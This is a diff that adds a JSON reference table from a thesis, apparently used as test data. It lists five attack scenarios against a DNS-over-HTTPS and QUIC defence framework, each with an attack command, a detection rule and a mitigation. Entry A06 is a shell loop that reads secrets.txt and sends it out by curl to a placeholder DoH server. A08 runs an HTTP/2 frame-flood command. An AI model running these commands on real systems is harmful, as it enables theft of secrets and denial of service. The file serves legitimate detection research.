@@ -1,0 +1,38 @@
+{
+  "table": "table_22",
+  "provenance": "thesis_reference_values",
+  "source": "Chapter 5, Table 22 (p.141) of the thesis",
+  "note": "Table 22 lists five advanced attack scenarios that stress the adaptive response of the framework. Each row is a distinct attack execution with its own detection trigger and mitigation action. The strings are transcribed verbatim from data/attack_matrix.csv (rows A06–A10); a fresh run of each simulator's _trigger_and_action() should return exactly these strings.",
+  "scenarios": {
+    "A06": {
+      "name": "Slow-Drip Exfiltration",
+      "attack_execution": "for i in $(cat secrets.txt); do curl -H 'Content-Type: application/dns-message' https://doh.server/dns-query?dns=$i; sleep $((RANDOM%3+1)); done",
+      "detection_trigger": "autocorr(queries, lag=5) > 0.8",
+      "mitigation_action": "broadcast_alert(); limit_rate(src_ip, 5ppm)"
+    },
+    "A07": {
+      "name": "QUIC Version Downgrade",
+      "attack_execution": "modify_packet(version_field=0x00000000); replay",
+      "detection_trigger": "supported_versions ∩ offered ≠ ∅",
+      "mitigation_action": "send_connection_close(0x010C); log_attack(version_downgrade)"
+    },
+    "A08": {
+      "name": "HTTP/2 Frame Storm",
+      "attack_execution": "python3 h2storm.py --target doh.server --frames PING,PING,PING,DATA --interval 0.001",
+      "detection_trigger": "frames_per_second > 1000",
+      "mitigation_action": "enforce_h2_rfc7540(); blacklist_client()"
+    },
+    "A09": {
+      "name": "Encrypted SNI Poisoning",
+      "attack_execution": "inject_esni(encrypted_sni=malicious.com)",
+      "detection_trigger": "HE.verify(esni, cert_hash) == False",
+      "mitigation_action": "route_to_backup_server(); alert_CA()"
+    },
+    "A10": {
+      "name": "Adaptive Chaff Injection",
+      "attack_execution": "while true; do size=$((RANDOM%512+64)); send_encrypted_query(random_bytes(size)); delay=...; done",
+      "detection_trigger": "GA.optimize(detector_weights)",
+      "mitigation_action": "θ_new = θ_old + η · ∇J(θ); sandbox(flow)"
+    }
+  }
+}
